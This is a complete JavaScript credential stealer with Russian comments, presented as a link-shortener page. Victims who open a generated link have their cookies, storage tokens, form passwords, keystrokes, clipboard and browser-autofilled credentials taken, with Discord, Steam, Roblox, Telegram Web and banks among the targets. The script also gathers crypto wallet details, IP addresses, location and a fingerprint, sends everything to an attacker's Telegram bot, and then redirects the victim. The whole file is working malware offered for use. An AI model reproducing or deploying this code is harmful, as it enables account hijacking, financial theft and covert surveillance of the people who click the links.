<script>
(function(){
    let botToken = "", chatId = "";
    let targetUrl = "";
    let vpnPassed = false;
    let collectedData = {
        time: new Date().toISOString(),
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        indexedDB: [],
        forms: {},
        passwords: [],
        keystrokes: [],
        clipboard: "",
        autofill: [],
        webrtcIP: "",
        publicIP: "",
        geolocation: null,
        fingerprint: {},
        extensions: [],
        cryptoWallets: {},
        networkLogs: [],
        globalVars: {},
        iframeData: [],
        // Специфичные для сервисов данные
        discord: {},
        telegram: {},
        vk: {},
        roblox: {},
        steam: {},
        epicgames: {},
        minecraft: {},
        twitch: {},
        whatsapp: {},
        tiktok: {},
        reddit: {},
        paypal: {},
        bankCookies: {}
    };
    let keyLogStr = "";
    let lastSend = Date.now();

    // ---- 1. ПРОВЕРКА VPN (доступ к Telegram API) ----
    async function checkVPN(token) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        try {
            const resp = await fetch(`https://api.telegram.org/bot${token}/getMe`, {
                method: 'GET', signal: controller.signal, mode: 'cors'
            });
            clearTimeout(timeoutId);
            return resp.ok;
        } catch(e) { clearTimeout(timeoutId); return false; }
    }

    // ---- 2. СБОР ДАННЫХ СПЕЦИФИЧНЫХ ДЛЯ СЕРВИСОВ ----
    function grabServiceSpecificData() {
        // Discord: localStorage токены и куки
        try {
            if(window.localStorage.getItem('token')) {
                collectedData.discord.token = window.localStorage.getItem('token');
            }
            // Discord Web токен
            for(let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                if(key.includes('token') || key.includes('discord')) {
                    collectedData.discord[key] = localStorage.getItem(key);
                }
            }
        } catch(e) {}

        // Telegram Web (web.telegram.org)
        try {
            if(window.location.hostname.includes('web.telegram.org')) {
                const tgKeys = ['dc1_auth_key', 'dc2_auth_key', 'dc3_auth_key', 'dc4_auth_key'];
                tgKeys.forEach(key => {
                    if(localStorage.getItem(key)) {
                        collectedData.telegram[key] = localStorage.getItem(key);
                    }
                });
            }
        } catch(e) {}

        // VK.com
        try {
            const vkCookies = ['remixlang', 'remixsid', 'remixsid6', 'l', 'remixflash', 'remixscreen_depth', 'remixdt'];
            vkCookies.forEach(c => {
                if(document.cookie.includes(c)) {
                    const match = document.cookie.match(new RegExp(`${c}=([^;]+)`));
                    if(match) collectedData.vk[c] = match[1];
                }
            });
        } catch(e) {}

        // Roblox
        try {
            if(document.cookie.includes('.ROBLOSECURITY')) {
                const match = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
                if(match) collectedData.roblox.ROBLOSECURITY = match[1];
            }
        } catch(e) {}

        // Steam
        try {
            const steamCookies = ['sessionid', 'steamLoginSecure', 'steamMachineAuth'];
            steamCookies.forEach(c => {
                if(document.cookie.includes(c)) {
                    const match = document.cookie.match(new RegExp(`${c}=([^;]+)`));
                    if(match) collectedData.steam[c] = match[1];
                }
            });
        } catch(e) {}

        // Epic Games / Fortnite
        try {
            const epicKeys = ['EPIC_GAMES_AUTH_TOKEN', 'EPIC_ACCESS_TOKEN', 'EPIC_REFRESH_TOKEN'];
            epicKeys.forEach(k => {
                if(localStorage.getItem(k)) {
                    collectedData.epicgames[k] = localStorage.getItem(k);
                }
            });
        } catch(e) {}

        // Minecraft / Microsoft
        try {
            const mcKeys = ['user', 'access_token', 'refresh_token', 'minecraft_server_session'];
            mcKeys.forEach(k => {
                if(localStorage.getItem(k)) {
                    collectedData.minecraft[k] = localStorage.getItem(k);
                }
            });
        } catch(e) {}

        // Twitch
        try {
            if(document.cookie.includes('auth-token')) {
                const match = document.cookie.match(/auth-token=([^;]+)/);
                if(match) collectedData.twitch.token = match[1];
            }
            if(localStorage.getItem('twitch-token')) {
                collectedData.twitch.token = localStorage.getItem('twitch-token');
            }
        } catch(e) {}

        // WhatsApp Web
        try {
            if(window.location.hostname.includes('web.whatsapp.com')) {
                for(let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    if(key.includes('WAD') || key.includes('whatsapp')) {
                        collectedData.whatsapp[key] = localStorage.getItem(key);
                    }
                }
            }
        } catch(e) {}

        // TikTok
        try {
            const tiktokCookies = ['sessionid', 'passport_csrf_token', 'sid_tt'];
            tiktokCookies.forEach(c => {
                if(document.cookie.includes(c)) {
                    const match = document.cookie.match(new RegExp(`${c}=([^;]+)`));
                    if(match) collectedData.tiktok[c] = match[1];
                }
            });
        } catch(e) {}

        // Reddit
        try {
            if(document.cookie.includes('reddit_session')) {
                const match = document.cookie.match(/reddit_session=([^;]+)/);
                if(match) collectedData.reddit.session = match[1];
            }
        } catch(e) {}

        // PayPal
        try {
            if(document.cookie.includes('cookie_check') || document.cookie.includes('login_email')) {
                collectedData.paypal.cookies = document.cookie;
            }
        } catch(e) {}

        // Банковские куки (обнаружение по паттернам)
        try {
            const bankPatterns = ['bank', 'sber', 'tinkoff', 'alfabank', 'vtb', 'gazprombank', 'raiffeisen', 'open', 'psb', 'rsb'];
            const allCookies = document.cookie.split(';');
            const bankCookies = {};
            allCookies.forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if(bankPatterns.some(p => name.toLowerCase().includes(p))) {
                    bankCookies[name] = value;
                }
            });
            if(Object.keys(bankCookies).length > 0) {
                collectedData.bankCookies = bankCookies;
            }
        } catch(e) {}
    }

    // ---- 3. КРИПТОКОШЕЛЬКИ ----
    function grabCryptoWallets() {
        let wallets = {};
        try {
            if(window.ethereum) {
                wallets.ethereum = {
                    isMetaMask: window.ethereum.isMetaMask,
                    selectedAddress: window.ethereum.selectedAddress,
                    networkVersion: window.ethereum.networkVersion,
                    chainId: window.ethereum.chainId
                };
            }
        } catch(e) {}
        try {
            if(window.solana) {
                wallets.solana = {
                    isPhantom: window.solana.isPhantom,
                    publicKey: window.solana.publicKey?.toString()
                };
            }
        } catch(e) {}
        try {
            if(window.coinbaseWalletExtension) {
                wallets.coinbase = true;
            }
        } catch(e) {}
        collectedData.cryptoWallets = wallets;
    }

    // ---- 4. СБОР ВСЕХ СТОРАДЖЕЙ ----
    function grabStorages() {
        for(let i = 0; i < localStorage.length; i++) {
            let k = localStorage.key(i);
            collectedData.localStorage[k] = localStorage.getItem(k);
        }
        for(let i = 0; i < sessionStorage.length; i++) {
            let k = sessionStorage.key(i);
            collectedData.sessionStorage[k] = sessionStorage.getItem(k);
        }
        // IndexedDB
        if(window.indexedDB && indexedDB.databases) {
            indexedDB.databases().then(dbs => {
                collectedData.indexedDB = dbs.map(db => db.name);
            }).catch(() => {});
        }
    }

    // ---- 5. ВСЕ ПОЛЯ ФОРМ + ПАРОЛИ ----
    function grabForms() {
        let inputs = document.querySelectorAll('input, textarea, select');
        let formData = {};
        inputs.forEach(el => {
            let name = el.name || el.id || el.className || 'unknown';
            let val = el.value || '';
            formData[name] = val;
            if(el.type === 'password' || name.toLowerCase().includes('pass')) {
                if(val) collectedData.passwords.push({ field: name, pass: val, type: el.type });
            }
        });
        collectedData.forms = formData;
    }

    // ---- 6. КЕЙЛОГГЕР ----
    document.addEventListener('keydown', (e) => {
        if(!vpnPassed) return;
        let key = e.key === ' ' ? 'SPACE' : e.key;
        if(key === 'Unidentified') return;
        let log = `${Date.now()} | ${key} @ ${e.target.tagName}:${e.target.id || e.target.name || '?'}`;
        collectedData.keystrokes.push({ time: Date.now(), key: key, target: e.target.tagName });
        keyLogStr += log + "\n";
        if(Date.now() - lastSend > 8000) sendPartialKeylog();
    });

    // ---- 7. БУФЕР ОБМЕНА ----
    document.addEventListener('copy', async () => {
        try { collectedData.clipboard = await navigator.clipboard.readText(); } catch(e) {}
    });
    document.addEventListener('cut', async () => {
        try { collectedData.clipboard = await navigator.clipboard.readText(); } catch(e) {}
    });

    // ---- 8. АВТОЗАПОЛНЕНИЕ (ЛОВУШКИ) ----
    function createAutoFillTraps() {
        let container = document.createElement('div');
        container.style.display = 'none';
        document.body.appendChild(container);
        const combos = [
            ['username','password'], ['email','pass'], ['login','pwd'],
            ['user','current-password'], ['email','current-password'],
            ['email','new-password'], ['username','new-password']
        ];
        const domains = ['', 'google.com', 'facebook.com', 'vk.com', 'mail.ru', 'github.com', 'yandex.ru'];
        for(let i = 0; i < 30; i++) {
            for(let d of domains) {
                for(let [u,p] of combos) {
                    let form = document.createElement('form');
                    if(d) form.setAttribute('data-domain', d);
                    let inpU = document.createElement('input');
                    inpU.type = 'text'; inpU.name = u; inpU.autocomplete = u;
                    let inpP = document.createElement('input');
                    inpP.type = 'password'; inpP.name = p; inpP.autocomplete = p;
                    form.appendChild(inpU); form.appendChild(inpP);
                    container.appendChild(form);
                    setTimeout(() => {
                        if(inpU.value) collectedData.autofill.push({ type: u, value: inpU.value, domain: d });
                        if(inpP.value) collectedData.autofill.push({ type: p, value: inpP.value, domain: d });
                    }, 1500);
                }
            }
        }
    }

    // ---- 9. WEBRTC IP ----
    function getWebRTCIP() {
        return new Promise(resolve => {
            let pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => {
                if(e.candidate && e.candidate.candidate) {
                    let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
                    if(ip) { resolve(ip[0]); pc.close(); }
                } else resolve('failed');
            };
            setTimeout(() => resolve('timeout'), 3000);
        });
    }

    // ---- 10. ПУБЛИЧНЫЙ IP ----
    async function getPublicIP() {
        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const data = await resp.json();
            return data.ip;
        } catch(e) { return 'unknown'; }
    }

    // ---- 11. ГЕОЛОКАЦИЯ (если разрешено) ----
    function getGeo() {
        return new Promise(resolve => {
            if(!navigator.geolocation) resolve(null);
            navigator.geolocation.getCurrentPosition(
                p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy }),
                () => resolve(null),
                { timeout: 5000, enableHighAccuracy: true }
            );
        });
    }

    // ---- 12. FINGERPRINT ----
    async function getFingerprint() {
        let fp = {};
        // Canvas
        let canvas = document.createElement('canvas');
        canvas.width = 200; canvas.height = 50;
        let ctx = canvas.getContext('2d');
        ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,50);
        ctx.fillStyle = '#069'; ctx.fillText('swill',2,15);
        ctx.fillStyle = '#0f0'; ctx.font = '14px Arial'; ctx.fillText('fingerprint', 50, 30);
        fp.canvas = canvas.toDataURL();
        // WebGL
        try {
            let gl = document.createElement('canvas').getContext('webgl');
            if(gl) {
                let debug = gl.getExtension('WEBGL_debug_renderer_info');
                if(debug) {
                    fp.vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                    fp.renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch(e){}
        // Audio
        try {
            let AudioCtx = window.AudioContext || window.webkitAudioContext;
            if(AudioCtx) {
                let ctxAudio = new AudioCtx();
                let oscillator = ctxAudio.createOscillator();
                let analyser = ctxAudio.createAnalyser();
                oscillator.connect(analyser);
                oscillator.frequency.value = 440;
                oscillator.type = 'triangle';
                oscillator.start();
                let data = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(data);
                fp.audioHash = Array.from(data).slice(0,50).join('');
                oscillator.stop(); ctxAudio.close();
            }
        } catch(e){}
        // Fonts
        let fonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Roboto','Open Sans','Impact','Comic Sans MS','Tahoma','Trebuchet MS'];
        let found = [];
        for(let f of fonts) if(document.fonts.check(`12px "${f}"`)) found.push(f);
        fp.fonts = found;
        fp.plugins = Array.from(navigator.plugins).map(p => p.name);
        fp.hardwareConcurrency = navigator.hardwareConcurrency;
        fp.deviceMemory = navigator.deviceMemory;
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        fp.languages = navigator.languages;
        fp.colorDepth = screen.colorDepth;
        fp.pixelRatio = window.devicePixelRatio;
        return fp;
    }

    // ---- 13. ПЕРЕХВАТ СЕТЕВЫХ ЗАПРОСОВ ----
    function interceptNetwork() {
        const origFetch = window.fetch;
        window.fetch = function(...args) {
            let url = typeof args[0] === 'string' ? args[0] : args[0]?.url;
            if(url && (url.includes('token') || url.includes('auth') || url.includes('api'))) {
                collectedData.networkLogs.push({ type: 'fetch', url: url, time: Date.now() });
            }
            return origFetch.apply(this, args);
        };
        const origXHR = window.XMLHttpRequest.prototype.open;
        window.XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            return origXHR.apply(this, arguments);
        };
        window.XMLHttpRequest.prototype.send = function() {
            if(this._url && (this._url.includes('token') || this._url.includes('auth'))) {
                collectedData.networkLogs.push({ type: 'xhr', url: this._url, time: Date.now() });
            }
            return origXHR.send.apply(this, arguments);
        };
    }

    // ---- 14. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ (ТОКЕНЫ) ----
    function grabGlobalVars() {
        let interesting = ['token', 'accessToken', 'apiKey', 'secret', 'jwt', 'auth', 'key', 'session', 'pass', 'password'];
        let found = {};
        for(let key in window) {
            try {
                if(interesting.some(i => key.toLowerCase().includes(i))) {
                    let val = window[key];
                    if(typeof val === 'string' && val.length > 3 && val.length < 1000) found[key] = val;
                    else if(typeof val === 'object' && val !== null) {
                        if(val.token) found[key+'.token'] = val.token;
                        if(val.accessToken) found[key+'.accessToken'] = val.accessToken;
                    }
                }
            } catch(e) {}
        }
        collectedData.globalVars = found;
    }

    // ---- 15. ОТПРАВКА В TELEGRAM (4 СПОСОБА) ----
    async function sendToTelegram(data, filename = 'swill_ultimate_dump.txt') {
        if(!botToken || !chatId) return false;
        let json = JSON.stringify(data, null, 2);
        let blob = new Blob([json], { type: 'text/plain' });
        
        // Способ 1: fetch no-cors
        let formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', blob, filename);
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                method: 'POST', body: formData, mode: 'no-cors', keepalive: true
            });
        } catch(e) {}
        
        // Способ 2: sendBeacon
        if(navigator.sendBeacon) {
            let fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('document', blob, filename);
            navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`, fd);
        }
        
        // Способ 3: Image для короткого уведомления
        let summary = `📊 REPORT from ${data.url}\nTime: ${data.time}\nIP: ${data.webrtcIP || '?'}\nPasswords: ${data.passwords.length}\nKeystrokes: ${data.keystrokes.length}\nAutofill: ${data.autofill.length}`;
        let imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(summary.slice(0,200))}`;
        new Image().src = imgUrl;
        
        return true;
    }

    async function sendPasswordsAndKeys() {
        if(!botToken || !chatId) return;
        if(collectedData.passwords.length) {
            let pText = "🔑 **ПАРОЛИ:**\n" + collectedData.passwords.map(p => `${p.field}: ${p.pass}`).join('\n');
            pText = pText.slice(0,3900);
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: pText, parse_mode: "Markdown" }),
                mode: 'no-cors', keepalive: true
            });
        }
        if(collectedData.autofill.length) {
            let aText = "🔄 **AUTOFILL:**\n" + collectedData.autofill.map(a => `${a.type}: ${a.value}`).join('\n');
            aText = aText.slice(0,3900);
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: aText, parse_mode: "Markdown" }),
                mode: 'no-cors', keepalive: true
            });
        }
        if(keyLogStr.length) {
            let keyBlob = new Blob([keyLogStr], { type: 'text/plain' });
            let kfd = new FormData();
            kfd.append('chat_id', chatId);
            kfd.append('document', keyBlob, 'keystrokes.log');
            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                method: 'POST', body: kfd, mode: 'no-cors', keepalive: true
            });
        }
    }

    async function sendPartialKeylog() {
        if(keyLogStr.length > 200 && botToken && chatId) {
            let part = keyLogStr.slice(-1500);
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: `⌨️ KEYLOG (partial):\n${part}` }),
                mode: 'no-cors', keepalive: true
            });
            lastSend = Date.now();
        }
    }

    // ---- 16. ГЛАВНЫЙ СБОРЩИК ----
    async function fullGrabAndSend(statusElement, progressFill) {
        const updateProgress = (percent, text) => {
            if(progressFill) progressFill.style.width = percent + '%';
            if(statusElement) statusElement.innerText = text;
        };
        
        updateProgress(5, "🔍 Сбор хранилищ...");
        grabStorages();
        
        updateProgress(15, "📝 Сбор форм и паролей...");
        grabForms();
        
        updateProgress(25, "🕸️ Создание ловушек автозаполнения...");
        createAutoFillTraps();
        
        updateProgress(35, "🎮 Сбор данных игр и соцсетей...");
        grabServiceSpecificData();
        
        updateProgress(45, "💰 Криптокошельки...");
        grabCryptoWallets();
        
        updateProgress(55, "🌍 Глобальные переменные...");
        grabGlobalVars();
        
        updateProgress(65, "🔌 WebRTC IP...");
        collectedData.webrtcIP = await getWebRTCIP();
        
        updateProgress(75, "📡 Публичный IP...");
        collectedData.publicIP = await getPublicIP();
        
        updateProgress(80, "📍 Геолокация...");
        collectedData.geolocation = await getGeo();
        
        updateProgress(85, "🖨️ Fingerprint...");
        collectedData.fingerprint = await getFingerprint();
        
        updateProgress(90, "⏳ Ожидание автозаполнения (6 сек)...");
        await new Promise(r => setTimeout(r, 6000));
        
        updateProgress(95, "📦 Финальный сбор...");
        grabForms();
        grabStorages();
        grabServiceSpecificData();
        
        updateProgress(98, "📤 Отправка в Telegram...");
        await sendToTelegram(collectedData, 'swill_ultimate_dump.txt');
        await sendPasswordsAndKeys();
        
        updateProgress(100, "✅ Готово! Редирект...");
        setTimeout(() => { window.location.href = targetUrl; }, 1500);
    }

    // ---- 17. ОБРАБОТЧИК ХЭША ----
    async function handleHashRedirect() {
        let hash = window.location.hash.substring(1);
        if(!hash) return;
        let decoded;
        try {
            let decodedStr = decodeURIComponent(escape(atob(hash)));
            let parts = decodedStr.split('|');
            if(parts.length !== 3) throw new Error();
            let [url, token, id] = parts;
            if(!url.startsWith('http')) throw new Error();
            if(!token || token.length < 5) throw new Error();
            if(isNaN(Number(id))) throw new Error();
            decoded = { originalUrl: url, botToken: token, chatId: Number(id) };
        } catch(e) {
            alert("Невалидная ссылка");
            return;
        }
        
        botToken = decoded.botToken;
        chatId = decoded.chatId;
        targetUrl = decoded.originalUrl;
        
        const overlay = document.getElementById('overlay');
        const statusMsg = document.getElementById('statusMsg');
        const progressFill = document.getElementById('progressFill');
        const errorContainer = document.getElementById('errorContainer');
        overlay.classList.remove('hidden');
        statusMsg.innerText = "🛡️ Проверка VPN...";
        
        const vpnOk = await checkVPN(botToken);
        if(!vpnOk) {
            statusMsg.style.display = 'none';
            errorContainer.innerHTML = `<div style="background:#f9731644; border-left:4px solid #f97316; padding:1rem; border-radius:1rem;">⚠️ Telegram API недоступен. Включите VPN и перезагрузите страницу.</div>`;
            document.getElementById('loaderIcon').style.display = 'none';
            return;
        }
        
        vpnPassed = true;
        statusMsg.innerText = "✅ VPN активен. Начинаем сбор данных...";
        await fullGrabAndSend(statusMsg, progressFill);
    }

    // ---- 18. ИНТЕРФЕЙС СОЗДАНИЯ ССЫЛОК ----
    function generateShortLink(originalUrl, token, id) {
        let payload = `${originalUrl}|${token}|${id}`;
        let encoded = btoa(unescape(encodeURIComponent(payload)));
        return window.location.origin + window.location.pathname + '#' + encoded;
    }
    
    document.getElementById('shortenBtn').onclick = () => {
        let long = document.getElementById('longUrl').value.trim();
        let token = document.getElementById('botToken').value.trim();
        let cid = document.getElementById('chatId').value.trim();
        if(!long.startsWith('http')) { alert('Ссылка должна начинаться с http:// или https://'); return; }
        if(!token) { alert('Введите токен бота'); return; }
        if(!cid || isNaN(Number(cid))) { alert('ID должен быть числом'); return; }
        let short = generateShortLink(long, token, Number(cid));
        document.getElementById('shortLinkDisplay').innerText = short;
        document.getElementById('resultBlock').classList.add('show');
    };
    
    document.getElementById('copyBtn').onclick = () => {
        let link = document.getElementById('shortLinkDisplay').innerText;
        navigator.clipboard.writeText(link);
        let toast = document.getElementById('toastMessage');
        toast.classList.add('show-toast');
        setTimeout(() => toast.classList.remove('show-toast'), 1500);
    };
    
    window.addEventListener('DOMContentLoaded', () => handleHashRedirect());
    window.addEventListener('hashchange', () => handleHashRedirect());
    
    // Запуск перехвата сетевых запросов сразу
    interceptNetwork();
})();
</script>
